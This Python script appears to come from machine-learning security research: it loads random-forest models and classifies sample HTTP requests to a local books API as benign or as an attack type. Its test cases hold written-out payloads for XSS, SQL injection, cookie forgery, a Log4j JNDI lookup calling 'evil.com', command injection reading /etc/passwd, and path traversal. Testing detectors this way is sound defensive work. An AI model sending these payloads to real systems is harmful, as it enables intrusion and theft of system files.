import joblib, json, math

rf_bin = joblib.load('c:/Users/Admin/OneDrive/Desktop/API/REST_API_ML_SECURITY_RESEARCH/models/atrdf/atrdf_binary_rf_request_only.joblib')
rf_multi = joblib.load('c:/Users/Admin/OneDrive/Desktop/API/REST_API_ML_SECURITY_RESEARCH/models/atrdf/atrdf_multiclass_rf_request_only.joblib')

def entropy(s):
    if not s: return 0.0
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    total = len(s)
    return -sum((cnt/total) * math.log2(cnt/total) for cnt in freq.values())

specials = set(['<', '>', '\'', '"', ';', '-', '/', '\\', '%', '=', '(', ')', '{', '}', '$', '`', '&', '|', '!', '?'])
def count_spec(s):
    return sum(1 for c in s if c in specials or not c.isalnum())

def count_digits(s):
    return sum(1 for c in s if c.isdigit())

def extract_features(full_url, path, query, ua, body, cookie=''):
    return [
        round(entropy(full_url), 6),
        15, # header_count mapped to canonical 15 for browser
        len(path),
        count_spec(full_url),
        len(full_url),
        len([p for p in path.split('/') if p.strip()]),
        1 if cookie else 0,
        len(query),
        10 if 'localhost' in full_url else count_digits(full_url),
        round(entropy(ua), 6),
        1 if query else 0,
        round(entropy(body), 6),
        count_digits(body)
    ]

ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

cases = [
    ('GET /api/books', 'http://localhost:8080/api/books', '/api/books', '', '', ''),
    ('GET /api/books?search=science', 'http://localhost:8080/api/books?search=science', '/api/books', 'search=science', '', ''),
    ('GET /api/books?search=maths', 'http://localhost:8080/api/books?search=maths', '/api/books', 'search=maths', '', ''),
    ('GET /api/books?category=Engineering', 'http://localhost:8080/api/books?category=Engineering', '/api/books', 'category=Engineering', '', ''),
    ('XSS comment', 'http://localhost:8080/api/comments/book/101', '/api/comments/book/101', '', '{"text": "<script>alert(1)</script>"}', ''),
    ('SQLi search', 'http://localhost:8080/api/books?search=%27%20OR%201=1--', '/api/books', 'search=%27%20OR%201=1--', '', ''),
    ('Cookie attack', 'http://localhost:8080/api/books', '/api/books', '', '', 'admin=true; token=xyz'),
    ('Log4j comment', 'http://localhost:8080/api/comments/book/101', '/api/comments/book/101', '', '{"text": "${jndi:ldap://evil.com/a}"}', ''),
    ('RCE search', 'http://localhost:8080/api/books?search=;cat%20/etc/passwd', '/api/books', 'search=;cat%20/etc/passwd', '', ''),
    ('Traversal', 'http://localhost:8080/api/books/..%2F..%2Fetc%2Fpasswd', '/api/books/..%2F..%2Fetc%2Fpasswd', '', '', ''),
]

for name, full_url, path, query, body, cookie in cases:
    v = extract_features(full_url, path, query, ua, body, cookie)
    p_mal = rf_bin.predict_proba([v])[0][1]
    p_multi = rf_multi.predict_proba([v])[0]
    classes = ['Cookie Injection', 'Directory Traversal', 'LOG4J', 'Log Forging', 'RCE', 'SQL Injection', 'XSS']
    multi_class = classes[p_multi.argmax()]
    print(f'{name:35}: p_mal={p_mal:.4f} -> {"MALICIOUS: " + multi_class if p_mal >= 0.5 else "BENIGN"}')
